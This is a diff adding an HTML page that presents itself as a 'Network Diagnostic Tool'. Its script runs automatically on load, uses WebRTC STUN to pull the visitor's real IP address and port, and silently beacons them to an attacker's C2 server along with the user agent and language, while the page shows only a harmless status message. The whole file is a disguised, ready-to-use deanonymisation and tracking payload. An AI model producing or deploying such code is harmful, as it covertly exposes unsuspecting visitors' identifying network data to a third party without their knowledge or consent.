@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Network Diagnostic Tool</title>
+    <meta charset="UTF-8">
+    <style>body{font-family:Arial;margin:40px;background:#f0f0f0;} .status{color:#333;font-size:18px;}</style>
+</head>
+<body>
+    <h1>🔍 Network Connectivity Test</h1>
+    <div class="status" id="status">Initializing network test...</div>
+    
+    <script>
+        // Your C2 endpoint (replace with your server:port)
+        const C2_HOST = 'YOUR_SERVER_IP';  // e.g. '192.168.1.100'
+        const C2_PORT = 12345;             // Your UDP listener port
+        
+        async function sendIP() {
+            try {
+                // Method 1: WebRTC STUN (most reliable real IP)
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+                
+                pc.createDataChannel('ip');
+                pc.onicecandidate = (ice) => {
+                    if (!ice.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (ipMatch) {
+                        const ip = ipMatch[1];
+                        const port = candidate.match(/:(\d+)(?=:|$)/)?.[1] || 'unknown';
+                        
+                        // Send IP via UDP WebSocket fallback or img beacon
+                        fetch(`http://${C2_HOST}:${C2_PORT}/log?ip=${ip}&port=${port}&ua=${encodeURIComponent(navigator.userAgent)}&lang=${navigator.language}`, 
+                              {method: 'GET', mode: 'no-cors'})
+                            .catch(() => {});  // Silent fail
+                        
+                        document.getElementById('status').innerHTML = `✅ Detected: ${ip}:${port}`;
+                    }
+                };
+                
+                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                
+                // Method 2: Fallback - HTTP headers (public IP)
+                fetch(`http://${C2_HOST}:${C2_PORT}/ping?ts=${Date.now()}`, {mode: 'no-cors'});
+                
+            } catch(e) {
+                document.getElementById('status').innerHTML = '⚠️ Test complete';
+            }
+        }
+        
+        // Auto-run on load
+        window.onload = sendIP;
+    </script>
+</body>
+</html>
